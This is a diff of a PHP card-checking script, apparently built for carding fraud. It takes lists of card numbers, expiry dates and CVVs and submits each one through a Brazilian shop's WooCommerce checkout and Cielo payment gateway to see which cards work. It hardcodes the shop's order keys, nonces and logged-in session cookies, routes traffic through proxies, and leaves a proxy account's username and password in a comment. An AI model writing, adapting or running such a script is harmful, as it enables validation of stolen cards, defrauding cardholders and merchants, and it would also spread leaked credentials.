@@ -5,9 +5,6 @@ sleep(5);
 set_time_limit(0);
 extract($_REQUEST);
 
-
-
-
 if (@$lista == ''){
 	exit('Lista em branco');
 }
@@ -24,14 +21,12 @@ if (strlen($mm)==1){
 
 $ch = curl_init();
 
-$ch = curl_init();
+$proxy = '127.0.0.1:8888';
+//$proxy_auth = 'brd-customer-hl_98932ec4-zone-data_center:y3mtdh39q9w9';
 
-$proxy = 'http://zproxy.lum-superproxy.io:22225';
-$proxy_auth = 'brd-customer-hl_98932ec4-zone-data_center:y3mtdh39q9w9';
+$url = "https://bymed.com.br/checkout/order-pay/190792/?pay_for_order=true&key=wc_order_kqkE7FmmqdOnB";
 
-$url = "https://bymed.com.br/checkout/order-pay/190798/?pay_for_order=true&key=wc_order_ue6gjCxcnjLKE";
-
-$post = 'cielo_webservice_boleto%5Bbandeira%5D=boleto&payment_method=loja5_woo_cielo_webservice&cielo_webservice%5Bbandeira%5D=visa&cielo_webservice%5Bhash%5D=71eb0b4e74d3b716a9fb5f26a91aff8520230222154146&cielo_webservice%5Btitular%5D=joao+victor&cielo_webservice%5Bfiscal%5D=00928234169&cielo_webservice%5Bnumero%5D='.$cc.'&cielo_webservice%5Bvalidade_mes%5D='.$mm.'&cielo_webservice%5Bvalidade_ano%5D='.$yy.'&cielo_webservice%5Bcvv%5D='.$cvv.'&cielo_webservice%5Bparcela%5D=MXwxfDI5MzMuOTB8ZG1sellRPT18TWprek15NDVNQT09fGVkOWQ4ZmNlYzRjMjQzNTBjNTc2MmQzYjBjNTAxNDgz&woocommerce_pay=1&terms=on&terms-field=1&woocommerce-pay-nonce=b5f785f9b0&_wp_http_referer=%2Fcheckout%2Forder-pay%2F190798%2F%3Fpay_for_order%3Dtrue%26key%3Dwc_order_ue6gjCxcnjLKE';
+$post = 'cielo_webservice_boleto%5Bbandeira%5D=boleto&payment_method=loja5_woo_cielo_webservice&cielo_webservice%5Bbandeira%5D=visa&cielo_webservice%5Bhash%5D=3b7f9583726087dda0188c3c06e33c7520230222021053&cielo_webservice%5Btitular%5D=fhghtht+httht&cielo_webservice%5Bfiscal%5D=08601789ervice%5Bnumero%5D='.$cc.'&cielo_webservice%5Bvalidade_mes%5D='.$mm.'&cielo_webservice%5Bvalidade_ano%5D='.$yy.'&cielo_webservice%5Bcvv%5D='.$cvv.'&cielo_webservice%5Bparcela%5D=MXwxfDg1LjEwfGRtbHpZUT09fE9EVXVNVEE9fDc2MWZhNDVmMTU5ZDcyZmZlODU0Y2FkZmNjZDRmY2U0&woocommerce_pay=1&terms=on&terms-field=1&woocommerce-pay-nonce=ec2d6833e5&_wp_http_referer=%2Fcheckout%2Forder-pay%2F190792%2F%3Fpay_for_order%3Dtrue%26key%3Dwc_order_kqkE7FmmqdOnB';
 
 
 	// VERIFICADOR DE BIN //
@@ -57,9 +52,7 @@ $re = array(
       die();
   }
 
-
-
-
+			// VERIFICADOR DE BIN //
 
 
 
@@ -93,8 +86,7 @@ $re = array(
 	'Sec-Fetch-Dest: document',
 	'Referer: https://bymed.com.br/checkout/order-pay/190792/?pay_for_order=true&key=wc_order_kqkE7FmmqdOnB',
 	'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-	'Cookie: _ga=GA1.3.170069401.1677117240; _gid=GA1.3.915644969.1677117240; wordpress_logged_in_ffc900da3a4cd9e55668cca9b7da9628=val+mende%7C1677290078%7CNSfhLGDp3I2v1My960dMxRE44KMaErJIeRKde9XJ1tB%7C5f017cf95c640e91555426c6b0dcd6c6d70f112b91b82566f240c82b5e480347; wp_woocommerce_session_ffc900da3a4cd9e55668cca9b7da9628=19013%7C%7C1677290100%7C%7C1677286500%7C%7Cb9e1ce368752b9c42c605924c57d8575; tk_ai=woo%3AM%2FGJ6fQihLRBAEhbEvwrzHJr; _gat=1',
-
+	'Cookie: _ga=GA1.3.1117166428.1677031294; _gid=GA1.3.652228051.1677031294; tk_ai=woo%3AxqmZs2R9JPhZLFiqUO6vynQj; wordpress_logged_in_ffc900da3a4cd9e55668cca9b7da9628=vabaw24689%40jobsfeel.com%7C1677204611%7CV0l3wT0WFd8p6Nwly76fBwWA3gY6zb41ZHIdG3qh1Un%7Ca38d4c3166036db3d2e670536100f0cbd1f92a4947109c1070129091eceee9b3; wp_woocommerce_session_ffc900da3a4cd9e55668cca9b7da9628=18988%7C%7C1677204620%7C%7C1677201020%7C%7C0a3158ffc395361cea21914d62bd2209',
 
 
 	)
